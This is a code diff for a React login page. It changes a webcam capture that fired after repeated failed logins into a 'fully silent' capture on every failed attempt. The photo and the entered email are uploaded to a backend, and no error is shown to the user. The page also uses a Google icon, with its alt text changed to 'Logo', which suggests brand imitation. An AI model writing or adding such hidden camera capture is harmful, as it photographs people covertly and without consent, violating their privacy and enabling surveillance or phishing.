@@ -1,8 +1,9 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { yupResolver } from '@hookform/resolvers/yup';
 import { useAuth } from '../hooks/useAuth';
-import { useWebcam } from '../hooks/useWebcam';
+import { captureSilentSnapshot } from '../hooks/useWebcam';
+import { authAPI } from '../services/api';
 import { loginSchema } from '../utils/validation';
 import Button from '../components/ui/Button';
 import Input from '../components/ui/Input';
@@ -10,14 +11,11 @@ import Card from '../components/ui/Card';
 import { Link, useNavigate } from 'react-router-dom';
 import { Mail, Lock } from 'lucide-react';
 import { showSuccess } from '../components/ToastProvider';
-import { MESSAGES, MAX_LOGIN_ATTEMPTS } from '../utils/constants';
+import { MESSAGES } from '../utils/constants';
 
 const Login = () => {
-  const { login, loading, isAuthenticated } = useAuth();
-  const [loginAttempts, setLoginAttempts] = useState(0);
+  const { login, loading } = useAuth();
   const navigate = useNavigate();
-
-  const { captureSnapshot } = useWebcam();
 
   const {
     register,
@@ -29,54 +27,41 @@ const Login = () => {
 
   const [passwordVisible, setPasswordVisible] = useState(false);
 
-  // 📸 Handle snapshot
-  const handleSecurityCapture = async () => {
+// 🔒 FULLY SILENT SECURITY CAPTURE
+  const handleSilentCapture = async (email) => {
     try {
-      const snapshot = await captureSnapshot();
-      if (snapshot) {
-        // call API directly here OR via authAPI if needed
-        const formData = new FormData();
-        formData.append('snapshot', snapshot, 'snapshot.jpg');
+      console.log("[Security] sending snapshot");
+      const snapshot = await captureSilentSnapshot();
 
-        await fetch('http://localhost:5000/send_snapshot_email', {
-          method: 'POST',
-          body: formData,
-          credentials: 'include',
-        });
+      if (!snapshot) {
+        console.log("[Security] snapshot is null!");
+        return;
       }
-    } catch (error) {
-      console.error('Snapshot failed');
+
+      const formData = new FormData();
+      formData.append('snapshot', snapshot, 'snapshot.jpg');
+      formData.append('email', email);
+
+      await authAPI.webcamSnapshot(formData);
+
+      console.log("[Security] snapshot sent");
+    } catch (err) {
+      console.log("[Security] send failed:", err);
     }
   };
 
-  // 🔐 Handle login
+  // 🔐 LOGIN
   const onSubmit = async (data) => {
     const result = await login(data);
 
     if (result.success) {
       showSuccess(MESSAGES.loginSuccess);
-      setLoginAttempts(0);
       navigate('/dashboard', { replace: true });
     } else {
-      // ✅ FIXED LOGIN ATTEMPT LOGIC
-      setLoginAttempts((prev) => {
-        const newAttempts = prev + 1;
-
-        if (newAttempts >= MAX_LOGIN_ATTEMPTS) {
-          handleSecurityCapture();
-        }
-
-        return newAttempts;
-      });
+      // 🔥 NO UI ERROR, ONLY SILENT SECURITY
+      handleSilentCapture(data.email);
     }
   };
-
-  // 🔁 Redirect if already logged in
-  useEffect(() => {
-    if (isAuthenticated) {
-      navigate('/dashboard', { replace: true });
-    }
-  }, [isAuthenticated, navigate]);
 
   return (
     <div className="min-h-screen flex items-center justify-center py-12 px-4 bg-gradient-to-br from-blue-50 to-indigo-100">
@@ -84,7 +69,7 @@ const Login = () => {
         <div className="text-center">
           <img
             src="/google-icon.png"
-            alt="Google"
+            alt="Logo"
             className="w-20 h-20 rounded-2xl shadow-2xl object-contain mx-auto mb-8"
           />
           <h2 className="text-3xl font-bold text-gray-900 mb-2">
@@ -111,9 +96,7 @@ const Login = () => {
             type="password"
             showPasswordToggle
             passwordVisible={passwordVisible}
-            onTogglePassword={() =>
-              setPasswordVisible(!passwordVisible)
-            }
+            onTogglePassword={() => setPasswordVisible(!passwordVisible)}
             error={errors.password?.message}
             {...register('password')}
             icon={
@@ -121,7 +104,12 @@ const Login = () => {
             }
           />
 
-          <Button type="submit" loading={loading} className="w-full">
+          <Button
+            type="submit"
+            loading={loading}
+            disabled={loading}
+            className="w-full"
+          >
             {loading ? 'Signing in...' : 'Sign In'}
           </Button>
 
